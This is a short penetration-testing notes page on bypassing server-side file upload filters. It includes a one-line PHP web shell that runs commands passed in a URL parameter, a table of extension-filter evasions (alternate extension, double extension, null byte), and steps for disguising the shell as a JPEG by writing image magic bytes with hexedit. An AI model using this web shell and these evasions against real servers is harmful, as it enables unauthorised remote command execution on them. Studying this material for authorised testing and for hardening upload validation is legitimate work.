# Server-side Bypass
This is often done blind, through trial and error by sending requests.

# Test the server
Perform the following tests on the server to enumerate the filter.

## 1. Which files are allowed?
Upload valid files and enumerate the file types you can upload to the server.

## 2. Which files are filtered out?
Attempt to upload a variety of web / reverse shells in order to test the filters in place.

shell.php
```php
<?php
echo system($_GET['cmd']);
```

# Filter Evaison
Common upload filters and how to bypass them:

## Extension Filtering
Some servers will filter using common regex or not completely cover all possibilities. 

| Filename | Technique |
| -------- | --------- |
| `shell.phtml` | Unique extension |
| `shell.jpg.php` | Repeating extension
| `shell.php%00.pdf` | NULL bytes |


## Magic Number
A fairly reliable way to check the MIME type of a file. 

Linux determines file types based on magic numbers therefore we can use the built-in `file` command to test our payload.
[Magic Number Cheatsheet](../../../Cheatsheets/magic-numbers.md)

```sh
file shell.php

shell.php: PHP script, ASCII text
```

Open the file and put `AAAA` at the begining. This will help us identify it in hexeditor.

The `AAAA` is represented by `41` `41` `41` `41`. 

```sh
hexedit shell.php

00000000 41 41 41 41
```

Using the JPG magic number and testing with `file`.  `Ctrl + X` will quit `hexedit`

```sh
00000000 FF D8 FF DB

file shell.php


shell.php:  JPEG image data
```
